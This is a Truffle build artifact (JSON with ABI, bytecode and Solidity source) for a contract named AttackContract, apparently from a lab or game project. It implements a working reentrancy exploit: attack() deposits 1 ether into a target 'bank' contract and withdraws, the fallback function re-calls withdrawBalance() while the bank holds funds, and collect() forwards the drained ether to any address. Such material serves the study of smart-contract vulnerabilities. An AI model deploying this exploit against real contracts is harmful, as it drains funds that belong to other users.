{
  "contractName": "AttackContract",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_bankAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback",
      "payable": true
    },
    {
      "inputs": [],
      "name": "bank",
      "outputs": [
        {
          "internalType": "contract ExternalPlayer",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "stateMutability": "payable",
      "type": "receive",
      "payable": true
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_amount",
          "type": "uint256"
        },
        {
          "internalType": "address payable",
          "name": "_address",
          "type": "address"
        }
      ],
      "name": "collect",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516105fd3803806105fd833981810160405281019061003291906100db565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b6100b88161009d565b81146100c357600080fd5b50565b6000815190506100d5816100af565b92915050565b6000602082840312156100f1576100f0610078565b5b60006100ff848285016100c6565b91505092915050565b6104e6806101176000396000f3fe6080604052600436106100435760003560e01c806312065fe01461011357806376cdb03b1461013e5780638d3c100a146101695780639e5faafc146101925761004a565b3661004a57005b670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106101115760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16635fd8c7106040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100f857600080fd5b505af115801561010c573d6000803e3d6000fd5b505050505b005b34801561011f57600080fd5b5061012861019c565b604051610135919061034c565b60405180910390f35b34801561014a57600080fd5b506101536101a4565b60405161016091906103e6565b60405180910390f35b34801561017557600080fd5b50610190600480360381019061018b9190610470565b6101c8565b005b61019a610213565b005b600047905090565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b8073ffffffffffffffffffffffffffffffffffffffff166108fc839081150290604051600060405180830381858888f1935050505015801561020e573d6000803e3d6000fd5b505050565b670de0b6b3a764000034101561022857600080fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663325ec768670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561029857600080fd5b505af11580156102ac573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16635fd8c7106040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561031957600080fd5b505af115801561032d573d6000803e3d6000fd5b50505050565b6000819050919050565b61034681610333565b82525050565b6000602082019050610361600083018461033d565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006103ac6103a76103a284610367565b610387565b610367565b9050919050565b60006103be82610391565b9050919050565b60006103d0826103b3565b9050919050565b6103e0816103c5565b82525050565b60006020820190506103fb60008301846103d7565b92915050565b600080fd5b61040f81610333565b811461041a57600080fd5b50565b60008135905061042c81610406565b92915050565b600061043d82610367565b9050919050565b61044d81610432565b811461045857600080fd5b50565b60008135905061046a81610444565b92915050565b6000806040838503121561048757610486610401565b5b60006104958582860161041d565b92505060206104a68582860161045b565b915050925092905056fea264697066735822122034ee7ff414aff15d1e2b9e23dd2056ea23724aa1cf684a38659b258c64922efc64736f6c634300080b0033",
  "immutableReferences": {},
  "source": "//SPDX-License-Identifier : MIT\npragma solidity ^0.8.0;\n\nimport \"./GameToken.sol\";\n\ncontract AttackContract {\n    ExternalPlayer public bank;\n\n    constructor(address _bankAddress) {\n        bank = ExternalPlayer(_bankAddress);\n    }\n    receive() external payable{}\n    fallback() external payable {\n        if (address(bank).balance >= 1 ether) {\n            bank.withdrawBalance();\n        }\n    }\n\n    function attack() external payable {\n        require(msg.value >= 1 ether);\n        bank.sendEtherToContract{value: 1 ether}();\n        bank.withdrawBalance();\n    }\n\n    function collect(uint256 _amount, address payable _address) public {\n\t    _address.transfer( _amount);\n    }\n\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}",
  "sourcePath": "/home/ian/cwapp/contracts/AttackContract.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.11+commit.d7f03943.Emscripten.clang"
  },
  "schemaVersion": "3.4.4",
  "updatedAt": "2023-04-03T01:35:09.399Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}